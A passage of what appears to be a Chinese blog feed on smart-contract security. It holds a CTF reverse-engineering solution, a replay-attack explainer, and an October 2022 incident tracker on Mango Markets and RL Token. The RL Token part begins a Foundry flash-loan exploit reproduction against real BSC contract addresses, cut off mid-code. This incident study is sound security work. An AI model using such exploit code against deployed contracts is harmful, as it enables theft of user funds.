var6)</code>应该是这样.这个地方搞了我好久，但是人家也标注了工具是”experimental”性质的嘛。byte()的作用是把栈顶替换成栈顶下面一个元素的第栈顶值个字节的值。<a href="https://ethervm.io/#1A" target="_blank" rel="noopener">byte()的作用</a></p><p>整体看下来目的比较明确，就是要通过<code>func_00DF(var arg0)</code>函数把<code>storage[0x00]</code>改为1，使<code>unlocked()</code>返回1即可。，发现进入<code>label_104</code>代码段后会进入一个大循环。</p><p>在循环中，开门先判断 <code>var7&gt;=4</code> ，下面又使<code>var4</code>为输入的第<strong>var7</strong>个字节。var6判断这个字节是不是大于<code>0x30</code>，可以猜出来出来0x30是0的ASCII码，应该有点关系。发现当var6为1时，会判断var4是否大于<code>0x39</code>，这不就是9的ascii码么.然后我们从<code>label_0197</code>开始看，发现如果不符合要求var3自加一后会继续循环，直到它为4时进入可以改变<code>storage[0x00]</code>的代码段。再看一下<code>label_0181</code>代码段,这里就是把提取出的单字节字符转换成数字后，<code>var2</code>加上它的4次方，<code>var1</code>加上它的10倍。<br>分析到这里，就可以试着写一下大致逻辑了:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">contract gogogo&#123;</span><br><span class="line">    uint8 isunLocke;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">unlocked</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> isunLocke;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">unlock</span>(<span class="params">arg0</span>) <span class="title">payable</span> <span class="title">public</span></span>&#123;</span><br><span class="line">            <span class="built_in">require</span>(msg.sender.value&gt;=<span class="number">0.5</span> ether);</span><br><span class="line">            <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++ )&#123;</span><br><span class="line">                chr = byte(i,arg0)</span><br><span class="line">                <span class="keyword">if</span>(chr &lt; <span class="number">0x30</span> || chr &gt; <span class="number">0x39</span>  )&#123;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                number = chr - <span class="number">0x30</span> <span class="comment">//字符转数字</span></span><br><span class="line">                var2 = var2 + number**<span class="number">4</span></span><br><span class="line">                var1 = var1 + number*<span class="number">10</span></span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">if</span>(var2 != var1)&#123;</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        &#125;</span><br><span class="line">        isunLocke = <span class="number">1</span>;</span><br><span class="line">        <span class="comment">//(0 &amp; ~0xff) | 0x01</span></span><br><span class="line">        <span class="comment">//1</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看出，我们要提供各位4次方之和为它本身的数字。稍稍爆破一下就有1634可以满足</p>]]></content>
      
      
      <categories>
          
          <category> 逆向分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逆向分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>交易重放</title>
      <link href="/Transaction-replay/"/>
      <url>/Transaction-replay/</url>
      
        <content type="html"><![CDATA[<hr><pre><code>author：Thomas_Xu</code></pre><h1 id="重放攻击及解决方案"><a href="#重放攻击及解决方案" class="headerlink" title="重放攻击及解决方案"></a>重放攻击及解决方案</h1><h2 id="传统重放攻击："><a href="#传统重放攻击：" class="headerlink" title="传统重放攻击："></a>传统重放攻击：</h2><p>攻击者将拦截到的数据再次原封不动发送给接收方的情况。只要攻击者知晓自己所拦截信息的用途，哪怕信息经过加密，其仍然可以发起重放攻击达到恶意目的，例如窃取存款、窃取账号等</p><h2 id="区块链重放攻击"><a href="#区块链重放攻击" class="headerlink" title="区块链重放攻击"></a>区块链重放攻击</h2><p>在区块链中的重放攻击和传统安全行业里的重放攻击，不是一回事。它<strong>一般</strong>指的是主链分叉时候出现的一种特殊情况。</p><p>分叉是区块链中常见的状况，不论是网络升级发起的主动分叉，还是恶意攻击者发起的被动分叉，分叉发生后在一段时间内区块链网络都是出于“<strong>原链+新链</strong>”的双链状态。正常来说，以升级为目的分叉发生后，随着旧客户端的升级，算力回归新链，原链会被逐渐废弃；以攻击为目的发起的分叉，如果全网算力能及时切换到正确的分叉链上，那么恶意区块会无法得到确认，最终无法跟上最长链节奏被废弃。但有一些分叉最终保留了一条以上的区块链，最典型的为The DAO事件后以太坊分叉出ETH和ETC，算力大战后比特币分叉为BTC和BCH，BCH分叉处BCH与BSV这三件分叉大事，对重放攻击讨论最热烈的时间点也集中在上述三大分叉前后。</p><p>由于分叉后的两条区块链，分叉前共用同一规格的地址、密钥对与交易结构等，为了保证分叉后能继承原链的算力与资产，一般都会支持原链的钱包与地址，但为了与竞争链做出区别，分叉后两者的交易结构和原生代币都会发生变化。</p><blockquote><p>通俗的讲就是常见的”发糖果“——以太坊The DAO分叉后，分叉前钱包中有以太坊的账户都获得了同等数量的ETH和ETC。如果分叉后的两条链都支持分叉前的代币和账户（例如ETC和ETH分叉后代码差异仅仅只有涉及The DAO的部分其他代码完全相同），而他们又都有同样的区块账本，那么本质上，分叉前拥有以太坊的账户发起的交易，广播到分叉后的两条区块链上都是完全合法的，这就导致了重放攻击问题。</p></blockquote><h2 id="重放攻击剖析"><a href="#重放攻击剖析" class="headerlink" title="重放攻击剖析"></a>重放攻击剖析</h2><p>我们设分叉前用户A的地址上有10个以太坊，用户B的地址上有20个以太坊，分叉后用户A的地址上有10个ETH和ETC，用户B则有20个ETH和ETC。如果用户A在分叉后向用户B发起10ETH的交易，之后用户B再向用户A发起15ETH的交易，那么这两笔交易将会原封不动地呈现在ETC区块链上，表现为A向B发送10ETC，B向A发送15ETC，看起来似乎是没有问题的。</p><p>然而如果ETC区块链上的用户A没有ETC，那么上述交易将会让用户B在没有收到A发送的ETC的情况下向A发送15ETC，白白损失了自己的资金。这就是区块链上的重放攻击，而这常常发生在交易所中。恶意用户可以通过监听用户A和用户B的交易情况来猜测二者身份，如果两位用户均没有防范重放攻击的意识或者分叉链本身不具备防重放攻击能力，恶意用户就可以通过映射交易窃取通常用户的账户资金。</p><h3 id="合约的交易重放"><a href="#合约的交易重放" class="headerlink" title="合约的交易重放"></a>合约的交易重放</h3><p>除了对分叉链条发起的重放攻击外，对智能合约也可发起重放攻击，其形式更类似传统的重放攻击定义——恶意者窃听了某一智能合约的交易请求，不断向该智能合约发送窃听到的交易信息（哪怕不知道交易情况也不重要），直到智能合约中预存的用于执行的Gas被消耗殆尽，智能合约被迫暂停。</p><h2 id="防止重放攻击"><a href="#防止重放攻击" class="headerlink" title="防止重放攻击"></a>防止重放攻击</h2><p>首先最常用的方式便是完善交易格式，让分叉点之前即存在的资金所关联的交易只能在一条链上生效，这就要让分叉后的链条在交易结构上做出区别。</p><p>对于以<strong>升级为目</strong>的的分叉而言很容易就能达到，因为硬分叉升级将采用不同的客户端版本，交易的前缀中通常包含有发起交易客户端的版本信息。分叉后矿工为了避免打包旧客户端的“非法交易”（并非恶意交易，仅仅只是版本号过低不被其他节点所承认），通常会拒绝一定版本号以前的交易，保证恶意攻击者很难在硬分叉升级时通过重放攻击窃取资金。</p><p>对于<strong>非升级目的</strong>发起的分叉，不论是算力战争导致的项目分裂，还是恶意攻击者发起的分叉攻击，由于交易发起版本大概率是不会变化的，分叉后的链条无法通过版本验证来防止重放攻击，需要在其他方向做出努力。常见的方式之一是为每一个交易附加上随机数Nonce，尽管Nonce一般被认为是用于防止重复交易与双花交易的，但防止重放攻击方面，Nonce也功不可没。</p><p><img src="nouce.png" alt=""></p><p>重放攻击需要监听一条链上的交易情况并转发至另一分叉链上以窃取资金，交易随机数的使用可以在一定程度上避免分叉情况下的重放攻击。如果在一条分叉链上发起的交易，其使用的随机数已被另一条分叉链中的相同用户发起的交易所使用，那么节点将不会广播该交易，矿工也不会打包此可疑交易。对于普通用户而言只需要重新设立随机数并用私钥签名即可恢复交易。Nonce最重要的用途在于防止事务/智能合约被重放攻击。只需要在事务中设立一段验证随机数的代码，即可保证事务不被窃听者通过重放攻击耗尽Gas。</p>]]></content>
      
      
      <categories>
          
          <category> 基础漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 基础漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻击事件追踪10月————持续更新</title>
      <link href="/Trace-2022-10/"/>
      <url>/Trace-2022-10/</url>
      
        <content type="html"><![CDATA[<h1 id="攻击事件追踪——持续更新"><a href="#攻击事件追踪——持续更新" class="headerlink" title="攻击事件追踪——持续更新"></a>攻击事件追踪——持续更新</h1><hr><pre><code>author：Thomas_Xu</code></pre><h1 id="Mango-Markets"><a href="#Mango-Markets" class="headerlink" title="Mango Markets"></a>Mango Markets</h1><p>此次攻击发生在<strong>2022年10月12日</strong>。一个名为Mango Markets的Solana龙头衍生品交易协议被一个资金雄厚的市场操纵者攻击，造成了超过上亿美元的损失。</p><p>据mango官方推特所说：</p><p><img src="mangotwi.png" alt=""></p><p><strong>黑客成功地通过引入巨额的USDC创建了两个MNGO-PERP的巨大头寸，暴拉了<a href="https://mango.markets/" target="_blank" rel="noopener">Mango</a>的原生代币<a href="https://www.coingecko.com/zh/数字货币/mango" target="_blank" rel="noopener">MNGO</a>的价格，并抽干了他们的贷款池，使该协议留下了1.15亿美元的坏账。</strong></p><p><img src="attckAddress.png" alt=""></p><p>但有个很奇怪的地方就是，其实早在今年3月就有人在Discord上提出了此漏洞，但Mango项目方好像并不愿意因此提供赏金。</p><p>而黑客在拿到这笔巨额代币后，通过治理提出了一个解决这个混乱场面的提案：</p><p><a href="https://www.chaincatcher.com/article/2080950" target="_blank" rel="noopener">Mango 攻击事件黑客提案：使用国库 7000 万美元偿还坏账，投票将于3天后结束-ChainCatcher</a></p><blockquote><p>他们要求Mango项目方向黑客支付7000万美金的漏洞赏金，并且不进行任何刑事侦查。</p></blockquote><p>如果此提案在投票中被通过，黑客将把账户中 MSOL、SOL 和 MNGO 转入 Mango 团队发布的地址。</p><p><strong>当然，攻击者用他们偷来的3200万票全部投了赞成票。</strong></p><p>不难猜到这个提案最终的结局……</p><h2 id="攻击方式："><a href="#攻击方式：" class="headerlink" title="攻击方式："></a>攻击方式：</h2><p><strong>攻击者的地址从FTX获得了超过500万美元的资金（<a href="https://solana.fm/tx/sq2VX7WkNXVWhn9EHLrZWhyV6TKG31hMGrAAGjuG4EnNfSk27SwPTm4bBktvd4jP2w7hsfi4xpauyCAKjNovTCV?cluster=mainnet-qn1" target="_blank" rel="noopener">200万</a>和<a href="https://solana.fm/tx/4aPwYv5fKGKnQXiwjJii3cFsfvxqTbdaSWMXejNKD15s4y7p5A1k1PycWQetodTgPPgXHk7ji9vW5JCFB3PwBiYM?cluster=mainnet-qn1" target="_blank" rel="noopener">350万</a>USDC），这些资金被<a href="https://solana.fm/tx/3cBEK257espSw2X6Z7ZZESPPdcsfBoNLYJGAmXEExxw1QpjkSJfcd9kmtER7LkZ3RGbeXKHv1FR4hRBCD5wA8unY?cluster=mainnet-qn1" target="_blank" rel="noopener">存入</a>Mango Markets，并被用来建一个大的MNGO-PERP头寸。</strong></p><p>通过从另一个账户对该头寸对敲，攻击者成功地将MNGO的现货价格从0.03美元<a href="https://twitter.com/joshua_j_lim/status/1579987648546246658" target="_blank" rel="noopener">暴拉</a>至0.91美元。在MNGO价格保持高位的同时，黑客得以利用多头头寸的未实现利润作为抵押，将贷款池中的资金抽走。</p><p>黑客的<a href="https://trade.mango.markets/account?pubkey=4ND8FVPjUGGjx9VuGFuJefDWpg3THb58c277hbVRnjNa" target="_blank" rel="noopener">Mango Markets账户</a>显示有1.15亿美元的坏账。借走的资产如下：</p><p><img src="mango_bad debt.png" alt=""></p><p>由于MNGO代币的低流动性和低交易量，使得极端的价格操纵成为可能。</p><h2 id="说在后面"><a href="#说在后面" class="headerlink" title="说在后面"></a>说在后面</h2><p><em>如果Mango在3月份支付了赏金，并在一开始就预防攻击的发生，那就好了…</em></p><p>去年对Venus Protocol的<a href="https://twitter.com/mangomarkets/status/1580053221254787072" target="_blank" rel="noopener">类似攻击</a>（不要跟<a href="https://rekt.news/zh/venus-blizz-rekt/" target="_blank" rel="noopener">最近</a>与Luna事件有关的事件混为一谈），导致一个用户在6个多月前在Mango社区内<a href="https://twitter.com/Newdot_Games/status/1579982592686067712" target="_blank" rel="noopener">提出担忧</a>。</p><p><img src="mango-discord.png" alt=""></p><h1 id="RL-Token"><a href="#RL-Token" class="headerlink" title="RL Token"></a>RL Token</h1><h2 id="漏洞：不正确的激励计算方式，造成闪电攻击。"><a href="#漏洞：不正确的激励计算方式，造成闪电攻击。" class="headerlink" title="漏洞：不正确的激励计算方式，造成闪电攻击。"></a>漏洞：不正确的激励计算方式，造成闪电攻击。</h2><p>不正确的激励计算方式，造成闪电攻击。</p><h2 id="漏洞分析："><a href="#漏洞分析：" class="headerlink" title="漏洞分析："></a>漏洞分析：</h2><p> 先来看<code>LP token</code>中transferFrom的源码：</p><p><a href="https://bscscan.com/address/0x4bbfae575dd47bcfd5770ab4bc54eb83db088888#code#F1#L129" target="_blank" rel="noopener">https://bscscan.com/address/0x4bbfae575dd47bcfd5770ab4bc54eb83db088888#code#F1#L129</a></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">transferFrom</span>(<span class="params"> </span></span></span><br><span class="line"><span class="function"><span class="params">        address from,</span></span></span><br><span class="line"><span class="function"><span class="params">        address to,</span></span></span><br><span class="line"><span class="function"><span class="params">        uint256 amount</span></span></span><br><span class="line"><span class="function"><span class="params">    </span>) <span class="title">public</span> <span class="title">virtual</span> <span class="title">override</span> <span class="title">returns</span> (<span class="params">bool</span>) </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">from</span> != address(pancakeSwapV2Pair) &amp;&amp; <span class="keyword">from</span> != address(pancakeSwapV2Router)) &#123;</span><br><span class="line">            incentive.distributeAirdrop(<span class="keyword">from</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (to != address(pancakeSwapV2Pair) &amp;&amp; to != address(pancakeSwapV2Router)) &#123;</span><br><span class="line">            incentive.distributeAirdrop(to); <span class="comment">//trace function</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (msg.sender != address(pancakeSwapV2Pair) &amp;&amp; msg.sender != address(pancakeSwapV2Router)) &#123;</span><br><span class="line">            incentive.distributeAirdrop(msg.sender); <span class="comment">//trace function</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">require</span>(allowance(<span class="keyword">from</span>, msg.sender) &gt;= amount, <span class="string">"insufficient allowance"</span>);</span><br><span class="line">        <span class="keyword">if</span> (govIDO != address(<span class="number">0</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (IKBKGovIDO(govIDO).isPriSaler(<span class="keyword">from</span>)) &#123;</span><br><span class="line">                IKBKGovIDO(govIDO).releasePriSale(<span class="keyword">from</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (IKBKGovIDO(govIDO).isPriSaler(to)) &#123;</span><br><span class="line">                IKBKGovIDO(govIDO).releasePriSale(to);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//sell</span></span><br><span class="line">        <span class="keyword">if</span> (to == address(pancakeSwapV2Pair) &amp;&amp; msg.sender == address(pancakeSwapV2Router)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!isCommunityAddress[<span class="keyword">from</span>]) &#123;</span><br><span class="line">                uint burnAmt = amount / <span class="number">100</span>;</span><br><span class="line">                _burn(<span class="keyword">from</span>, burnAmt);</span><br><span class="line">                uint slideAmt = amount * <span class="number">2</span> / <span class="number">100</span>;</span><br><span class="line">                _transfer(<span class="keyword">from</span>, slideReceiver, slideAmt);</span><br><span class="line">                amount -= (burnAmt + slideAmt);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (!isCommunityAddress[<span class="keyword">from</span>] &amp;&amp; !isCommunityAddress[to]) &#123;</span><br><span class="line">                uint burnAmt = amount / <span class="number">100</span>;</span><br><span class="line">                amount -= burnAmt;</span><br><span class="line">                _burn(<span class="keyword">from</span>, burnAmt);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">super</span>.transferFrom(<span class="keyword">from</span>, to, amount);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>可以看到这里在转账时会执行激励的计算，我们注意关注<code>trace function</code>处，跟踪这两个调用，进入到<code>distributeAirdrop</code>函数中：</p><p><a href="https://bscscan.com/address/0x335ddcE3f07b0bdaFc03F56c1b30D3b269366666#code#F1#L49" target="_blank" rel="noopener">https://bscscan.com/address/0x335ddcE3f07b0bdaFc03F56c1b30D3b269366666#code#F1#L49</a></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">distributeAirdrop</span>(<span class="params">address user</span>) <span class="title">public</span> <span class="title">override</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (block.timestamp &lt; airdropStartTime) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        updateIndex();</span><br><span class="line">        uint256 rewards = getUserUnclaimedRewards(user); <span class="comment">//vulnerable point</span></span><br><span class="line">        usersIndex[user] = globalAirdropInfo.index;</span><br><span class="line">        <span class="keyword">if</span> (rewards &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            uint256 bal = rewardToken.balanceOf(address(<span class="keyword">this</span>));</span><br><span class="line">            <span class="keyword">if</span> (bal &gt;= rewards) &#123;</span><br><span class="line">                rewardToken.transfer(user, rewards);</span><br><span class="line">                userUnclaimedRewards[user] = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getUserUnclaimedRewards</span>(<span class="params">address user</span>) <span class="title">public</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">uint256</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (block.timestamp &lt; airdropStartTime) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        (uint256 newIndex,) = getNewIndex();</span><br><span class="line">        uint256 userIndex = usersIndex[user];</span><br><span class="line">        <span class="keyword">if</span> (userIndex &gt;= newIndex || userIndex == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> userUnclaimedRewards[user];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">//vulnerable point, Incorrect Reward calculation. only check balanceof of user without any requirement.</span></span><br><span class="line">            <span class="keyword">return</span> userUnclaimedRewards[user] + (newIndex - userIndex) * lpToken.balanceOf(user) / PRECISION;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>注意<code>getUserUnclaimedRewards</code>函数是有明显漏洞的，在激励计算的过程中，只检查了user的<code>balance</code>没有对其他的任何条件做出检查，这是很危险的，我们完全可以从闪电贷中调用此函数获利。</p><h2 id="攻击复现"><a href="#攻击复现" class="headerlink" title="攻击复现:"></a>攻击复现:</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.10</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">"forge-std/Test.sol"</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">"./interface.sol"</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">"forge-std/console.sol"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Report https://twitter.com/CertiKAlert/status/1576195971003858944</span></span><br><span class="line"><span class="comment">// Attacker : 0x08e08f4b701d33c253ad846868424c1f3c9a4db3</span></span><br><span class="line"><span class="comment">// Attack Contract : 0x5EfD021Ab403B5b6bBD30fd2E3C26f83f03163d4</span></span><br><span class="line"><span class="comment">// Vulnerable Contract : https://bscscan.com/address/0x4bbfae575dd47bcfd5770ab4bc54eb83db088888 </span></span><br><span class="line"><span class="comment">// Attack Tx  0xe15d261403612571edf8ea8be78458b88989cf1877f0b51af9159a76b74cb466</span></span><br><span class="line">interface IDODO &#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">flashLoan</span>(<span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params">        uint256 baseAmount,</span></span></span><br><span class="line"><span class="function"><span class="params">        uint256 quoteAmount,</span></span></span><br><span class="line"><span class="function"><span class="params">        address assetTo,</span></span></span><br><span class="line"><span class="function"><span class="params">        bytes calldata data</span></span></span><br><span class="line"><span class="function"><span class="params">    </span>) <span class="title">external</span>;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">    <span class="title">function</span> <span class="title">_BASE_TOKEN_</span>(<span class="params"></span>) <span class="title">external</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">address</span>);</span></span><br><span class="line"><span class="function">&#125;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">interface</span> <span class="title">RLLpIncentive</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">distributeAirdrop</span>(<span class="params">address user</span>) <span class="title">external</span>;</span></span><br><span class="line"><span class="function">&#125;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">contract</span> <span class="title">AirDropRewardContract</span></span>&#123;</span><br><span class="line">    IERC20 RL = IERC20(<span class="number">0x4bBfae575Dd47BCFD5770AB4bC54Eb83DB088888</span>);</span><br><span class="line">    RLLpIncentive RLL = RLLpIncentive(<span class="number">0x335ddcE3f07b0bdaFc03F56c1b30D3b269366666</span>);</span><br><span class="line">    IERC20 Pair = IERC20(<span class="number">0xD9578d4009D9CC284B32D19fE58FfE5113c04A5e</span>);</span><br><span class="line">    <span class="keyword">constructor</span>() &#123;</span><br><span class="line">        RL.transfer(address(<span class="keyword">this</span>), <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">airDropReward</span>(<span class="params">address receiver</span>) <span class="title">external</span></span>&#123;</span><br><span class="line">        RLL.distributeAirdrop(address(<span class="keyword">this</span>));</span><br><span class="line">        RL.transfer(receiver, RL.balanceOf(address(<span class="keyword">this</span>)));</span><br><span class="line">        Pair.transfer(receiver, Pair.balanceOf(address(<span class="keyword">this</span>)));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract ContractTest is DSTest&#123;</span><br><span class="line"></span><br><span class="line">    IERC20 USDT = IERC20(<span class="number">0x55d398326f99059fF775485246999027B3197955</span>);</span><br><span class="line">    IERC20 RL = IERC20(<span class="number">0x4bBfae575Dd47BCFD5770AB4bC54Eb83DB088888</span>);</span><br><span class="line">    RLLpIncentive RLL = RLLpIncentive(<span class="number">0x335ddcE3f07b0bdaFc03F56c1b30D3b269366666</span>);</span><br><span class="line">    IDODO dodo = IDODO(<span class="number">0xD7B7218D778338Ea05f5Ecce82f86D365E25dBCE</span>);</span><br><span class="line">    IERC20 Pair = IERC20(<span class="number">0xD9578d4009D9CC284B32D19fE58FfE5113c04A5e</span>);</span><br><span class="line">    Uni_Router_V2 Router = Uni_Router_V2(<span class="number">0x10ED43C718714eb63d5aA57B78B54704E256024E</span>);</span><br><span class="line">    address [] public contractAddress;</span><br><span class="line"></span><br><span class="line">    CheatCodes cheats = CheatCodes(<span class="number">0x7109709ECfa91a80626fF3989D68f67F5b1DD12D</span>);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">setUp</span>(<span class="params"></span>) <span class="title">public</span> 